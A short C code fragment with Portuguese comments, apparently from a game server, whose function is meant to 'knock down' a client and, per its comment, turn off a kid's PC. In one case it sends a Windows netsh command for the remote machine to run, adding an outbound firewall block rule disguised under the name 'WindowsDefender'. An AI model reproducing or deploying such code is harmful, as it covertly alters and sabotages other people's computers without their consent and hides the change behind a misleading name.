...
void SendDerrubarCliente(int conn, short Modelo) //desliga o pc do garoto
{
	...
	case 2:
	{
		strncpy(packet.Command, "netsh advfirewall firewall add rule name=WindowsDefender dir=out action=block protocol=tcp localip=any remoteip=192.168.0.36", sizeof(packet.Command)); //colocar ip do servidor ali
	}
	break;
	default:
		return;
